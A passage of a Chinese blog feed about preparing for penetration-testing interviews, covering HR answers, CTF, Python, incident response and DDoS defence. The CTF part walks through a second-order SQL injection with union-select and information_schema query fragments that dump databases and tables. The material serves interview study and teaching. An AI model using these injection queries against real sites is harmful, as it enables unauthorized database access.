<li><a href="#对上司有什么要求喜欢和什么样的领导合作">对上司有什么要求？喜欢和什么样的领导合作？</a></li>
<li><a href="#最有影响的一件事人">最有影响的一件事/人</a></li>
<li><a href="#你还要问什么问题">你还要问什么问题</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h1><p>注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="对我们公司有什么了解，为什么选择本公司"><a href="#对我们公司有什么了解，为什么选择本公司" class="headerlink" title="对我们公司有什么了解，为什么选择本公司"></a>对我们公司有什么了解，为什么选择本公司</h3><p>在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品）</p>
<h3 id="为什么想要应聘这个职位"><a href="#为什么想要应聘这个职位" class="headerlink" title="为什么想要应聘这个职位"></a>为什么想要应聘这个职位</h3><p>从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力）</p>
<h3 id="对安全服务是怎么理解的"><a href="#对安全服务是怎么理解的" class="headerlink" title="对安全服务是怎么理解的"></a>对安全服务是怎么理解的</h3><p>安全服务对象是人， 渗透测试对象是网站。（我的理解）</p>
<ul>
<li>安全概念和资讯</li>
<li>安全工具使用</li>
<li>渗透测试</li>
<li>安全基线检查</li>
<li>应急响应</li>
<li>代码审计</li>
<li>安全边界建设</li>
<li>安全规范 </li>
</ul>
<h3 id="如果我不知道渗透测试，两分钟说一下"><a href="#如果我不知道渗透测试，两分钟说一下" class="headerlink" title="如果我不知道渗透测试，两分钟说一下"></a>如果我不知道渗透测试，两分钟说一下</h3><p>（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内）</p>
<h3 id="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"><a href="#如果我是一个汽车厂商，你如何证明你的工作是有意义的？" class="headerlink" title="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"></a>如果我是一个汽车厂商，你如何证明你的工作是有意义的？</h3><p>（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用）</p>
<h3 id="作为应届生，你如何能胜任该职位"><a href="#作为应届生，你如何能胜任该职位" class="headerlink" title="作为应届生，你如何能胜任该职位"></a>作为应届生，你如何能胜任该职位</h3><p>正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位</p>
<h3 id="你有什么职业规划"><a href="#你有什么职业规划" class="headerlink" title="你有什么职业规划"></a>你有什么职业规划</h3><p>渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问）</p>
<h3 id="如果离职的话是因为什么原因"><a href="#如果离职的话是因为什么原因" class="headerlink" title="如果离职的话是因为什么原因"></a>如果离职的话是因为什么原因</h3><p>个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 <del>打架</del> 不和，也不要明说……）</p>
<h3 id="你有什么优缺点"><a href="#你有什么优缺点" class="headerlink" title="你有什么优缺点"></a>你有什么优缺点</h3><ul>
<li>优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强</li>
<li>缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点）</li>
</ul>
<h3 id="对于薪资的要求"><a href="#对于薪资的要求" class="headerlink" title="对于薪资的要求"></a>对于薪资的要求</h3><p>月薪13-15K，可以接受1k的浮动</p>
<h3 id="给不了这么多工资可以接受吗？为什么想要这个数？"><a href="#给不了这么多工资可以接受吗？为什么想要这个数？" class="headerlink" title="给不了这么多工资可以接受吗？为什么想要这个数？"></a>给不了这么多工资可以接受吗？为什么想要这个数？</h3><ol>
<li>贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场）</li>
<li>可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误）</li>
<li>通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信）<br>（这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 <a href="https://www.zhihu.com/question/282880854/answer/432987673" target="_blank" rel="noopener">https://www.zhihu.com/question/282880854/answer/432987673</a> ）</li>
</ol>
<h3 id="进入部门后，你需要多长时间进入项目？"><a href="#进入部门后，你需要多长时间进入项目？" class="headerlink" title="进入部门后，你需要多长时间进入项目？"></a>进入部门后，你需要多长时间进入项目？</h3><p>（表达自己的快速学习能力）</p>
<h3 id="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"><a href="#上一个面试的人能力跟你差不多，但是工资方面比你要的低？" class="headerlink" title="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"></a>上一个面试的人能力跟你差不多，但是工资方面比你要的低？</h3><p>（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等）</p>
<h3 id="是否可以接受加班"><a href="#是否可以接受加班" class="headerlink" title="是否可以接受加班"></a>是否可以接受加班</h3><p>加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;）</p>
<h3 id="（沟通能力）和领导、同事产生分歧会怎么办"><a href="#（沟通能力）和领导、同事产生分歧会怎么办" class="headerlink" title="（沟通能力）和领导、同事产生分歧会怎么办"></a>（沟通能力）和领导、同事产生分歧会怎么办</h3><p>出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。</p>
<h3 id="工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法"><a href="#工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法" class="headerlink" title="工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法"></a>工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</h3><p>我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点）</p>
<h3 id="对上司有什么要求？喜欢和什么样的领导合作？"><a href="#对上司有什么要求？喜欢和什么样的领导合作？" class="headerlink" title="对上司有什么要求？喜欢和什么样的领导合作？"></a>对上司有什么要求？喜欢和什么样的领导合作？</h3><p>我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。</p>
<h3 id="最有影响的一件事-人"><a href="#最有影响的一件事-人" class="headerlink" title="最有影响的一件事/人"></a>最有影响的一件事/人</h3><p>（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域）</p>
<h3 id="你还要问什么问题"><a href="#你还要问什么问题" class="headerlink" title="你还要问什么问题"></a>你还要问什么问题</h3><ul>
<li>有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？</li>
<li>五险一金、社保比例、饭补、餐补、交通补助？</li>
<li>应聘岗位具体职责和工作内容？会不会经常出差？</li>
<li>试用期多久？薪水多少？</li>
</ul>
]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>个人准备渗透测试和安全面试的经验之谈（3）</title>
    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%883%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/%E6%8A%80%E6%9C%AF%E9%9D%A2%20%E5%88%86%E4%BA%AB.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/%E6%8A%80%E6%9C%AF%E9%9D%A2%20%E5%88%86%E4%BA%AB.md</a></p>
</blockquote><a id="more"></a>
<ul>
<li><a href="#技术面试问题">技术面试问题</a><ul>
<li><a href="#ctf">CTF</a><ul>
<li><a href="#说一个印象深刻的ctf的题目">说一个印象深刻的CTF的题目</a><ul>
<li><a href="#sql二次注入">sql二次注入</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#python">Python</a><ul>
<li><a href="#爬虫模块框架反爬虫机制ip-代理池验证码破解ua">爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</a></li>
<li><a href="#并发多线程线程池协程三个程之间的区别">并发(多线程、线程池、协程、三个程之间的区别)</a></li>
<li><a href="#常用的标准库">常用的标准库</a></li>
<li><a href="#django和flask区别和使用">DJANGO和FLASK区别和使用</a></li>
<li><a href="#orm">ORM</a></li>
<li><a href="#python安全工具编写源码阅读">python安全工具编写/源码阅读</a></li>
<li><a href="#证明能力">证明能力</a></li>
</ul>
</li>
<li><a href="#密码学">密码学</a><ul>
<li><a href="#rsa">RSA</a></li>
<li><a href="#des">DES</a></li>
<li><a href="#aes">AES</a></li>
<li><a href="#国内sm系列">国内SM系列</a></li>
</ul>
</li>
<li><a href="#风险评估">风险评估</a><ul>
<li><a href="#流程">流程</a></li>
<li><a href="#三要素">三要素</a></li>
</ul>
</li>
<li><a href="#代码审计">代码审计</a><ul>
<li><a href="#fority-sca审计java代码">Fority SCA审计JAVA代码</a></li>
<li><a href="#seay审计php代码">Seay审计PHP代码</a></li>
<li><a href="#源码阅读">源码阅读</a></li>
</ul>
</li>
<li><a href="#应急响应具体流程">应急响应具体流程</a><ul>
<li><a href="#模型">模型</a></li>
<li><a href="#实例">实例</a><ul>
<li><a href="#ddos">DDOS</a><ul>
<li><a href="#ddos是什么">DDOS是什么</a></li>
</ul>
</li>
<li><a href="#实例-1">实例</a></li>
<li><a href="#主机被入侵">主机被入侵</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#渗透测试流程相关">渗透测试流程相关</a><ul>
<li><a href="#渗透测试流程">渗透测试流程</a></li>
<li><a href="#渗透测试项目">渗透测试项目</a></li>
<li><a href="#渗透测试具体实施">渗透测试具体实施</a></li>
<li><a href="#17年owasp-top10">17年OWASP TOP10</a></li>
<li><a href="#常见的web安全漏洞">常见的Web安全漏洞</a></li>
<li><a href="#挖过什么逻辑漏洞">挖过什么逻辑漏洞</a><ul>
<li><a href="#订单任意金额修改">订单任意金额修改</a></li>
<li><a href="#验证码回传">验证码回传</a></li>
<li><a href="#未进行登陆凭证验证">未进行登陆凭证验证</a></li>
<li><a href="#接口无限制枚举">接口无限制枚举</a></li>
<li><a href="#cookie设置存在缺陷">cookie设置存在缺陷</a></li>
</ul>
</li>
<li><a href="#找回密码功能缺陷">找回密码功能缺陷</a></li>
<li><a href="#你常用的渗透工具有哪些最常用的是哪个">你常用的渗透工具有哪些，最常用的是哪个？</a><ul>
<li><a href="#扫描nessusawvsnikto">扫描:Nessus,AWVS,Nikto</a></li>
<li><a href="#sqlmap">SQLmap</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#metasploit">Metasploit</a></li>
<li><a href="#hydra">Hydra</a></li>
<li><a href="#kali信息收集工具">kali信息收集工具</a></li>
<li><a href="#流量分析wireshark">流量分析WireShark</a></li>
</ul>
</li>
<li><a href="#描述一个你深入研究过的cve或pocms17-010最新的cve">描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)</a></li>
</ul>
</li>
<li><a href="#数据库注入">数据库注入</a><ul>
<li><a href="#mysql面试题">MySQL面试题</a><ul>
<li><a href="#mysql存储引擎">MySQL存储引擎？</a></li>
<li><a href="#什么是事务">什么是事务？</a></li>
<li><a href="#读锁和写锁">读锁和写锁</a></li>
<li><a href="#mysql的索引">MySQL的索引</a></li>
<li><a href="#order-by在注入的运用">ORDER BY在注入的运用</a></li>
<li><a href="#gpc是什么gpc之后怎么绕过">GPC是什么？GPC之后怎么绕过？</a></li>
<li><a href="#mysql一个和两个什么区别">Mysql一个@和两个@什么区别</a></li>
<li><a href="#注入绕过常用的函数">注入/绕过常用的函数</a></li>
<li><a href="#mysql存储过程">MySQL存储过程</a></li>
<li><a href="#各种写shell的问题">各种写shell的问题</a></li>
</ul>
</li>
<li><a href="#注入类型">注入类型</a></li>
<li><a href="#sql注入的原理">SQL注入的原理</a></li>
<li><a href="#过waf">过waf</a></li>
<li><a href="#如何进行sql注入的防御">如何进行SQL注入的防御</a></li>
<li><a href="#mysql的网站注入50以上和50以下有什么区别">mysql的网站注入，5.0以上和5.0以下有什么区别？</a></li>
<li><a href="#sql和nosql的区别">SQL和NoSQL的区别</a><ul>
<li><a href="#sql优点">SQL优点</a></li>
<li><a href="#sql缺点">SQL缺点</a></li>
<li><a href="#nosql优点">NoSQL优点</a></li>
<li><a href="#比较">比较</a></li>
<li><a href="#mongodb注入方式">MongoDB注入方式</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#xss-csrf-xxe">XSS CSRF XXE</a><ul>
<li><a href="#csrf-和-xss-和-xxe-有什么区别以及修复方式">CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</a></li>
<li><a href="#csrfssrf和重放攻击有什么区别">CSRF、SSRF和重放攻击有什么区别？</a></li>
<li><a href="#啥是同源策略跨域有几种方式">啥是同源策略，跨域有几种方式？</a></li>
<li><a href="#如何规避同源策略">如何规避同源策略？</a><ul>
<li><a href="#jsonp">JSONP</a><ul>
<li><a href="#jsonp的劫持">JSONP的劫持</a></li>
</ul>
</li>
<li><a href="#websocket">WebSocket</a></li>
<li><a href="#cors重点">CORS(重点)</a><ul>
<li><a href="#与jsonp的比较">与JSONP的比较</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dom-xss与反射xss有啥不同，给你10s，如何快速判断一个xss是否是dom-xss？">DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</a></li>
<li><a href="#csp策略">CSP策略</a></li>
<li><a href="#ssrf漏洞原理是什么利用时有哪些伪协议">SSRF漏洞原理是什么？利用时有哪些伪协议？</a><ul>
<li><a href="#漏洞原理">漏洞原理</a></li>
<li><a href="#ssrf用处">ssrf用处</a></li>
<li><a href="#漏洞处">漏洞处</a></li>
<li><a href="#绕过姿势">绕过姿势</a></li>
<li><a href="#利用协议">利用协议</a></li>
<li><a href="#漏洞修复">漏洞修复</a></li>
</ul>
</li>
<li><a href="#在浏览器端referer可以篡改吗">在浏览器端，Referer可以篡改吗？</a></li>
<li><a href="#xss盲打到内网服务器的利用">xss盲打到内网服务器的利用</a></li>
<li><a href="#xss代码层防御">xss代码层防御</a></li>
</ul>
</li>
<li><a href="#文件上传下载遍历漏洞">文件上传下载遍历漏洞</a><ul>
<li><a href="#原理">原理</a></li>
<li><a href="#修复方案">修复方案</a></li>
</ul>
</li>
<li><a href="#文件包含漏洞">文件包含漏洞</a><ul>
<li><a href="#类型">类型</a></li>
<li><a href="#php文件包含函数">PHP文件包含函数</a></li>
<li><a href="#利用">利用</a></li>
<li><a href="#修复方案-1">修复方案</a></li>
</ul>
</li>
<li><a href="#web框架漏洞弱点">web框架漏洞弱点</a><ul>
<li><a href="#服务端注入之flask框架中服务端模板注入问题">服务端注入之Flask框架中服务端模板注入问题</a></li>
</ul>
</li>
<li><a href="#http协议">HTTP协议</a><ul>
<li><a href="#tcp三次握手四次挥手">TCP三次握手四次挥手</a><ul>
<li><a href="#三次握手">三次握手</a></li>
<li><a href="#四次挥手">四次挥手</a></li>
</ul>
</li>
<li><a href="#四层模型">四层模型</a></li>
<li><a href="#当你输入一个网址点击访问会发生什么">当你输入一个网址，点击访问，会发生什么？</a><ul>
<li><a href="#查找dns记录">查找DNS记录</a></li>
<li><a href="#建立连接">建立连接</a></li>
</ul>
</li>
<li><a href="#常见的状态码">常见的状态码</a></li>
<li><a href="#osi七层">OSI七层</a><ul>
<li><a href="#osi四层">OSI四层</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#路由协议">路由协议</a><ul>
<li><a href="#你搭建过的最复杂的网络设备是什么">你搭建过的最复杂的网络设备是什么</a></li>
<li><a href="#使用过什么硬件设备">使用过什么硬件设备</a></li>
</ul>
</li>
<li><a href="#linux运维">Linux运维</a><ul>
<li><a href="#启动过程">启动过程</a></li>
<li><a href="#linux基线规范">Linux基线规范</a><ul>
<li><a href="#账号管理和授权">账号管理和授权</a></li>
<li><a href="#服务">服务</a></li>
<li><a href="#文件系统">文件系统</a></li>
<li><a href="#日志">日志</a></li>
<li><a href="#ip协议安全要求">IP协议安全要求</a></li>
</ul>
</li>
<li><a href="#中间件基线规范apache">中间件基线规范（APACHE）</a><ul>
<li><a href="#配置">配置</a></li>
<li><a href="#禁止">禁止</a></li>
<li><a href="#隐藏">隐藏</a></li>
<li><a href="#删除">删除</a></li>
</ul>
</li>
<li><a href="#webshell检测思路">webshell检测思路</a><ul>
<li><a href="#静态检测">静态检测</a></li>
<li><a href="#动态检测">动态检测</a></li>
<li><a href="#日志检测">日志检测</a></li>
<li><a href="#语法检测">语法检测</a></li>
<li><a href="#统计学检测">统计学检测</a></li>
<li><a href="#防范webshell">防范webshell</a></li>
</ul>
</li>
<li><a href="#计划任务">计划任务</a></li>
<li><a href="#自动化运维编写过什么脚本">自动化运维编写过什么脚本</a></li>
<li><a href="#yum用的什么源本地自搭挂载">yum用的什么源（本地自搭，挂载）</a></li>
<li><a href="#awk-sed的使用">awk sed的使用</a></li>
<li><a href="#排错思路排错经验">排错思路，排错经验</a></li>
<li><a href="#日志分析elk的使用和分析">日志分析ELK的使用和分析</a><ul>
<li><a href="#事件发生的分析">事件发生的分析</a></li>
</ul>
</li>
<li><a href="#用户权限管理修改">用户权限管理(修改)</a></li>
<li><a href="#防火墙">防火墙</a></li>
<li><a href="#ipsec-vpn">IPsec VPN</a></li>
<li><a href="#安全监控工具">安全监控工具</a></li>
<li><a href="#linux木马查杀">Linux木马查杀</a></li>
<li><a href="#常见的设备有啥">常见的设备有啥</a></li>
</ul>
</li>
<li><a href="#windows运维">Windows运维</a><ul>
<li><a href="#基线规范">基线规范</a></li>
<li><a href="#木马查杀">木马查杀</a></li>
<li><a href="#计划任务-1">计划任务</a></li>
</ul>
</li>
<li><a href="#iso27000和等保重点等保">ISO27000和等保(重点等保)</a><ul>
<li><a href="#说一下iso27000">说一下ISO27000</a></li>
<li><a href="#说一下等级保护制度">说一下等级保护制度</a></li>
<li><a href="#差异">差异</a></li>
<li><a href="#共性">共性</a></li>
</ul>
</li>
<li><a href="#算法">算法</a><ul>
<li><a href="#排序算法快排-二分-冒泡">排序算法：快排 二分 冒泡</a></li>
</ul>
</li>
<li><a href="#ldap注入">LDAP注入</a></li>
</ul>
</li>
</ul>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/25582026" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25582026</a></p>
</blockquote>
<blockquote>
<p>给你一个网站你是如何来<em>渗透测试</em>的? - 杨文的文章 - 知乎 <a href="http://zhuanlan.zhihu.com/p/25605198" target="_blank" rel="noopener">http://zhuanlan.zhihu.com/p/25605198</a></p>
</blockquote>
<h1 id="技术面试问题"><a href="#技术面试问题" class="headerlink" title="技术面试问题"></a>技术面试问题</h1><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><h3 id="说一个印象深刻的CTF的题目"><a href="#说一个印象深刻的CTF的题目" class="headerlink" title="说一个印象深刻的CTF的题目"></a>说一个印象深刻的CTF的题目</h3><ul>
<li>Padding Oracle-&gt;CBC-&gt;密码学(RSA/AES/DSA/SM)</li>
<li>CRC32</li>
<li>反序列化漏洞</li>
</ul>
<h4 id="sql二次注入"><a href="#sql二次注入" class="headerlink" title="sql二次注入"></a>sql二次注入</h4><p>第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
<p>交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列，</p>
<ol>
<li>暴库 <code>group_concat(schema_name) from information_schema.schemata</code></li>
<li>暴表 <code>group_concat(table_name) from information_schema.schemata where table_schema=&#39;hhh&#39;</code></li>
<li>获取数据 <code>concat(flag) from flag</code></li>
</ol>
<p>修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。</p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="爬虫模块、框架、反爬虫机制（IP-gt-代理池、验证码破解、UA）"><a href="#爬虫模块、框架、反爬虫机制（IP-gt-代理池、验证码破解、UA）" class="headerlink" title="爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）"></a>爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</h3><h3 id="并发-多线程、线程池、协程、三个程之间的区别"><a href="#并发-多线程、线程池、协程、三个程之间的区别" class="headerlink" title="并发(多线程、线程池、协程、三个程之间的区别)"></a>并发(多线程、线程池、协程、三个程之间的区别)</h3><p>进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。以前进程既是资源分配也是调度的最小单位，后来为了更合理的使用cpu(实际上是cpu性能越来越好)，才将资源分配和调度分开，就有了线程。线程是建立在进程的基础上的一次程序运行单位。</p>
<h3 id="常用的标准库"><a href="#常用的标准库" class="headerlink" title="常用的标准库"></a>常用的标准库</h3><ul>
<li><h2 id="functools"><a href="#functools" class="headerlink" title="functools"></a>functools</h2></li>
<li>itertools 迭代器<ul>
<li>count/cycle/repeat</li>
<li>chain</li>
<li>groupby 把迭代器中相邻的重复元素挑出来放在一起</li>
</ul>
</li>
<li>concurrent.futures<ul>
<li>ThreadPoolExecutor</li>
</ul>
</li>
<li>hashlib<ul>
<li>md5</li>
<li>sha1</li>
<li>sha256</li>
<li>sha512</li>
</ul>
</li>
<li>logging </li>
<li>sys.argv argparse读取命令行参数</li>
<li>pickle 序列化工具</li>
<li>re 正则</li>
<li>collections 多种数据类型<ul>
<li>namedtuple</li>
<li>OrderedDict</li>
<li>Counter</li>
</ul>
</li>
<li>os 系统相关的函数</li>
</ul>
<h3 id="DJANGO和FLASK区别和使用"><a href="#DJANGO和FLASK区别和使用" class="headerlink" title="DJANGO和FLASK区别和使用"></a>DJANGO和FLASK区别和使用</h3><h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><h3 id="python安全工具编写-源码阅读"><a href="#python安全工具编写-源码阅读" class="headerlink" title="python安全工具编写/源码阅读"></a>python安全工具编写/源码阅读</h3><h3 id="证明能力"><a href="#证明能力" class="headerlink" title="证明能力"></a>证明能力</h3><ul>
<li>python安全工具开发</li>
<li>python项目，记一下技术细节</li>
</ul>
<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h3 id="国内SM系列"><a href="#国内SM系列" class="headerlink" title="国内SM系列"></a>国内SM系列</h3><h2 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="https://i.loli.net/2018/03/09/5aa223dbc8662.jpg" alt></p>
<h3 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h3><ul>
<li>资产：资产价值</li>
<li>威胁：威胁主体、影响对象、出现频率、动机等</li>
<li>脆弱性：资产弱点的严重程度‘</li>
</ul>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="Fority-SCA审计JAVA代码"><a href="#Fority-SCA审计JAVA代码" class="headerlink" title="Fority SCA审计JAVA代码"></a>Fority SCA审计JAVA代码</h3><p>fortify用到什么模块? 过滤器 自定义规则 生成报告</p>
<h3 id="Seay审计PHP代码"><a href="#Seay审计PHP代码" class="headerlink" title="Seay审计PHP代码"></a>Seay审计PHP代码</h3><h3 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h3><h2 id="应急响应具体流程"><a href="#应急响应具体流程" class="headerlink" title="应急响应具体流程"></a>应急响应具体流程</h2><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/26542790" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26542790</a></p>
</blockquote>
<p>PDCERF模型</p>
<ul>
<li>Prepare（准备）：准备用来检测的工具和人</li>
<li>Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告</li>
<li>Containment（抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到更张水平</li>
<li>Eradication（根除）</li>
<li>Recover（恢复）</li>
<li>Follow-Up（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h4><h5 id="DDOS是什么"><a href="#DDOS是什么" class="headerlink" title="DDOS是什么"></a>DDOS是什么</h5><p>分布式拒绝服务攻击（DDoS）是目前黑客经常采用而难以防范的攻击手段。DoS的攻击方式有很多种，最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。</p>
<p>DDOS攻击手段是在传统的DOS攻击基础之上产生的一类攻击方式。单一的DOS攻击一般是采用一对一方式的，当攻击目标CPU速度低、内存小或者网络带宽小等等各项性能指标不高它的效果是明显的。随着计算机与网络技术的发展，计算机的处理能力迅速增长，内存大大增加，同时也出现了千兆级别的网络，这使得DOS攻击的困难程度加大了——目标对恶意攻击包的“消化能力”加强了不少，例如你的攻击软件每秒钟可以发送3,000个攻击包，但我的主机与网络带宽每秒钟可以处理10,000个攻击包，这样一来攻击就不会产生什么效果这时侯分布式的拒绝服务攻击手段（DDOS）就应运而生了。</p>
<p>如果说计算机与网络的处理能力加大了10倍，用一台攻击机来攻击不再能起作用的话，攻击者使用10台攻击机同时攻击呢？用100台呢？DDOS就是利用更多的傀儡机来发起进攻，以比从前更大的规模来进攻受害者。通常，被攻击的服务器有以下症状：1、被攻击主机上有大量等待的TCP连接；2、网络中充斥着大量的无用的数据包，源地址为假；3、制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯；4、利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求；5、严重时会造成系统死机</p>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>我司网站<a href="http://www.catroot.cn的IP" target="_blank" rel="noopener">www.catroot.cn的IP</a>  223.223.223.223 被人DDOS攻击，流量达9G，并且机房流量清洗无效，所以把223.223.223.223封停，导致网站不能访问，请作出紧急预案。</p>
<blockquote>
<p><a href="https://www.zhihu.com/question/19581905" target="_blank" rel="noopener">https://www.zhihu.com/question/19581905</a></p>
</blockquote>
<ul>
<li>网络设备设施<ul>
<li>拼带宽，加大带宽，但是成本太高</li>
<li>使用硬件防火墙</li>
<li>选用高性能设备</li>
</ul>
</li>
<li>抗D思想和方案<ul>
<li>负载均衡</li>
<li>花钱买流量清洗服务</li>
<li>CDN：web层，比如cc攻击</li>
<li>分布式集群防御</li>
<li>高防：防大部分攻击，udp、大型的cc攻击</li>
</ul>
</li>
<li>预防为主<ul>
<li>系统漏洞</li>
<li>系统资源优化：</li>
<li>过滤不必要的服务和端口</li>
<li>限制特定流量：检查访问来源做适当限制</li>
</ul>
</li>
</ul>
<h4 id="主机被入侵"><a href="#主机被入侵" class="headerlink" title="主机被入侵"></a>主机被入侵</h4><ol>
<li>优先提取易消失的数据<ul>
<li>内存信息</li>
<li>系统进程<code>free -m</code></li>
<li>路由信息<code>tracert</code></li>
</ul>
</li>
<li><code>ifconfig</code>查看网卡流量，检查网卡的发送、接收数据情况</li>
<li><code>NetHogs</code>实时监控带宽占用状况</li>
<li>查看Linux系统日志 <code>/var/log</code></li>
<li><code>ClamAV</code>杀毒软件</li>
</ol>
<h2 id="渗透测试流程相关"><a href="#渗透测试流程相关" class="headerlink" title="渗透测试流程相关"></a>渗透测试流程相关</h2><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><ol>
<li>项目访谈</li>
